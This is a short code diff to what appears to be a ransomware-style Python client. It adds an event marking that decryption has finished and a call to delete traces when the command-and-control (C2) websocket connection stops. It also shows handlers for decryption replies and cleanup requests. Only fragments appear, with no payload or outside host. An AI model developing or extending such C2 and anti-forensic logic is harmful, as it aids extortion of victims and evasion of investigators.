@@ -14,6 +14,7 @@ class Program():
         self.__should_cli_run = True
         self.__id = ""
         self.connected = asyncio.Event()
+        self.decrypted = asyncio.Event()
         self.__client: WebsocketClient = None
         if data is not None:
             self.__found_files = data.get("found_files", [])
@@ -36,6 +37,8 @@ class Program():
                 print("Stopping C2 connection...")
                 if self.__client is not None:
                     await self.__client.stop()
+
+                self.delete_traces()
             case "auto":
                 pass
             case "manual":
@@ -384,6 +387,7 @@ class Program():
 
                 message_reply["type"] = "decryption_res"
                 message_reply["data"] = {"result": result}
+                self.decrypted.set()
                 
             case "cleaning_req":
                 self.delete_traces()
